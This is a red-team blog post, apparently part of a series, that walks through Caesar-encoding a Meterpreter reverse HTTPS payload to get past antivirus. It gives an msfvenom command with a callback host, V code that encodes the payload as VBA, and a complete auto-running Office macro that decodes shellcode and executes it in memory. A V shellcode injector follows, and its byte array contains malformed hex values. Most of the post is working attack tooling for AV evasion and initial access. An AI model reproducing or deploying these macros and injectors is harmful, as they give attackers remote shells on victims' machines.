---
layout: single
title:  "OffensiVe Security with V 4 - Caesar"
date:   2022-08-09 16:55:50 -0500
categories: red-team
tags: vlang windows
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
     - label: "View Code"
       url: "https://github.com/alexfrancow/offensive-vlang"  
---

In the previous part of this series of posts, the [XOR Cipher](https://alexfrancow.github.io/app-development/OffensiVe-Security-with-V-3-XOR/) was detailed, in this part another **cipher technique** with **Caesar encryption** will be investigated in order to mitigate **AV defenses**.

## Caesar Cipher

The **Caesar cipher** was one of the earliest encryption schemes and is very simple. It is categorized as a **substitution cipher** since it substitutes a letter or number by shifting it to the right by the number specified in the key.

```text
Input Output
C -> D
a -> b
e -> f
s -> t
a -> b
r -> s
```

For this, the following code will be used, which shows the encryption method in the **V** language.
First, we'll need to generate a payload, to do so we'll use the following snippet from `msfvenom`.

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.86 LPORT=443 -f csharp
```

Once the payload was generated the output will be similar at the following.

```bash
byte[] buf = new byte[547] {
    0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,
    ..snip..
    0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
```

It will be necessary to convert the **csharp** output to **V**, for this we copy each byte *(547)* in the same way and we will group it by square brackets. To get something similar to the following code block.

```bash
buf := [
    byte(0xfc),0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,
    ..snip..
    0x38,0x36,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 ]
```

The next step will be to implement the **Caesar encryption** algorithm. To do this, iterates over all the characters of the **payload**, exchanging them with a **sum** of **+2** (It could be a sum of any number).
To implement that, the following code was created.
```c
fn main() {
    // Caesar cipher
    mut encoded := buf.clone()
    for i := 0; i < buf.len; i++ {
        encoded[i] = buf[i] + 2 & 0xFF
    }
```

>  We performed a bitwise **AND** *(&)* operation with `0xFF` to keep the modified value within the 0-255 range (single byte) in case the increased byte value exceeds `0xFF`.

Once we have each byte replaced, it is converted to VBA code. To do this, add the string `buf = Array(` at the beginning, a `)` at the end and add a `, _` every 30 iterations. This is necessary so that office can read the payload.
The following code shows the theory.
```c
    // To VBA
    mut v := ''
    for i := 0; i < encoded.len; i++ {
        if i == 0 {
            v += 'buf = Array(${encoded[i]}, '
        }
        else if i  == encoded.len - 1 {
            v += '${encoded[i]})'
        }
        else {
            if i % 30 == 0 {
	              v += '${encoded[i]}, _ \n'
	      }
            else {
                v += '${encoded[i]}, '
            }
        }
    }

    println(v)
}
```

It is also possible to convert it to **Hexadecimal**.
```c
    // To Hex
    mut h := ''
    for i := 0; i < encoded.len; i++ {
        h += '0x${int(encoded[i]):x}, '
    }
```

Or to a **String**.
```c
    // To string
    mut s := ''
    for i := 0; i < encoded.len; i++ {
        s += encoded[i].ascii_str()
    }
```

The output of the code will be the payload in **VBA** format, which we can import into an **Office macro** as shown in the following example.
Here it is necessary to subtract the number of substitutions that we have made when encrypting the payload with **Caesar** *(-2)*.
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    buf = Array(254, 234, 145, 2, 2, 2, 98, 51, 212, 139, 231, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 141, 116, 42, 17, 185, 76, 40, 51, 1, 51, _
    ..snip..
    231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, 54, 59, 48, 58, 56, 2, 189, 242, 183, 164, 88, 108, 2, _
    85, 1, 215)

    ' Caesar decipher
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

Instead of using an **Office macro**, it is possible to inject a **Hexadecimal shellcode** directly with **V**.

```c
module main
import time

#flag -luser32
#flag -lkernel32

fn C.VirtualAlloc(voidptr, u32, u32, u32) voidptr
fn C.RtlMoveMemory(voidptr, voidptr, u32)
fn C.CreateThread(voidptr, u32, voidptr, voidptr, u32, &u32) voidptr

fn inject(shellcode []byte) bool {
    println('Creating virtualAlloc')
    address_pointer := C.VirtualAlloc(voidptr(0), usize(sizeof(shellcode)), 0x3000, 0x40)

    println('WriteProcessMemory')
    C.RtlMoveMemory(address_pointer, shellcode.data, shellcode.len)

    println('CreateRemoteThread')
    C.CreateThread(voidptr(0), u32(0), voidptr(address_pointer), voidptr(0), 0, &u32(0))
    time.sleep(1 * time.second)
    return true
}

fn main() {
    buf := [
    byte(0xfe), 0xea, 0x971,33, 0x32, 0x30x, 0x6d, 0x79, 0x65, 0xa1, 0xc8, 0x6c, 
    ..snip..
    0x21, 0x50x2, 0x6a, 0x2,]

    // Caesar decipher
    mut shellcode := buf.clone()
    for i := 0; i < buf.len; i++ {
        shellcode[i] = buf[i] - 2
    }
    inject(shellcode)
}
```

It is possible to **build** the above code with:

```bash
v caesar.v
```

### Demo

<iframe width="560" height="315" src="https://www.youtube.com/embed/D6csaUgbVxw" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
